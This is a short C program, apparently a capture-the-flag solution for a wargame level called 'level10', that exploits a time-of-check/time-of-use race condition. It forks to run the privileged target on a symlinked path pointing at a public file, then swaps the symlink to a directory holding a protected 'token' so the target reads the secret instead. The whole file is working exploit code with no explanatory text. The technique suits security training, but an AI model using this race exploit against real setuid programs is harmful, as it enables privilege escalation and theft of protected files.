#include <stdlib.h>
#include <unistd.h>

int main()
{
    // Assumes directories and links:
    // dir0/lnk -> public file
    // dir1/lnk -> token
    // activedir -> dir0
    // Let the victim run
    if (fork() == 0)
    {
        system("./level10 activedir/lnk 127.0.0.1");
        exit(0);
    }
    usleep(1); // yield CPU
    // Switch where target points
    unlink("activedir");
    symlink("/tmp/dir1", "activedir");
}
